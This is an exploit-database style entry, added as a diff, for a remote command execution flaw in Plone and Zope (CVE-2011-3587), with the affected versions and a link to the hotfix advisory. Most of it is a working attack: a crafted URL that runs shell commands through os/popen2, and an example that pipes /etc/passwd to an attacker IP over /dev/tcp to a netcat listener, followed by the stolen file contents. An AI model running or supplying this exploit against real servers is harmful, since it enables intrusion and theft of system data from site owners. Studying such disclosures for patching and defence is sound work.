@@ -1,0 +1,55 @@
+# Exploit Title: Plone - Remote Command Execution
+# Date: 12/21/2011
+# Author: Nick Miles (www.npenetrable.com)
+# Tested on: 12/21/2011
+# CVE : CVE-2011-3587
+
+Versions Affected (without hotfix): Plone 4.0 (through 4.0.9); Plone
+4.1; Plone 4.2 (a1 and a2); Zope 2.12.x and Zope 2.13.x.
+Versions Not Affected: Versions of Plone that use Zope other than Zope
+2.12.x and Zope 2.13.x.
+
+Advisory/Hotfix: http://plone.org/products/plone/security/advisories/20110928
+
+You can execute any command on the remote Plone server with the
+following request
+if the server is Unix/Linux based (Note: you won't get returned the
+results of the command):
+
+http://PLONE_SITE/p_/webdav/xmltools/minidom/xml/sax/saxutils/os/popen2?cmd=<command
+to run>
+
+Example:
+
+Listen for a connection:
+$ nc -l 4040
+
+On victim, visit:
+http://victim/p_/webdav/xmltools/minidom/xml/sax/saxutils/os/popen2?cmd=cat%20/etc/passwd%20%20%3E%20/dev/tcp/172.20.6.218/4040
+
+Response:
+$ nc -l 4040
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+games:x:12:100:games:/usr/games:/sbin/nologin
+gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
+ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+nobody:x:99:99:Nobody:/:/sbin/nologin
+vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
+saslauth:x:499:499:"Saslauthd user":/var/empty/saslauth:/sbin/nologin
+postfix:x:89:89::/var/spool/postfix:/sbin/nologin
+sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
+ntp:x:38:38::/etc/ntp:/sbin/nologin
+tcpdump:x:72:72::/:/sbin/nologin
+apache:x:48:48:Apache:/var/www:/sbin/nologin
+mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
+plone:x:500:500::/home/plone:/bin/false
